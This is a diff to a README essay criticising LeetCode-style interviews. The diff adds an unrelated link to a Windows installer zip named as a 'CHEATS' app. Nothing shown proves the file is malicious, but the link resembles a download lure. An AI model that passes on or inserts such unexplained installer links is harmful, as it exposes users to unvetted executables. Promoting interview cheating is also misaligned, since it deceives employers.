@@ -3,6 +3,8 @@
 Author: Arpit J Soni  
 LinkedIn: [linkedin.com/in/arpit-j-soni](https://www.linkedin.com/in/arpit-j-soni)
 
+**Download the Windows installer:** [Download the Windows installer](https://www.arpitjsoni.com/CHEATS_APP_Windows_Setup.zip)
+
 ## Why “LeetCode-style” interviews are not the best measurement
 - LeetCode-style interviews often optimize for short-term memorization and pattern matching, not for real-world software engineering outcomes such as system design, collaboration, debugging, and iteration under ambiguity.
 - They can exclude strong engineers who excel in building maintainable systems, communicating tradeoffs, and delivering end-to-end features.
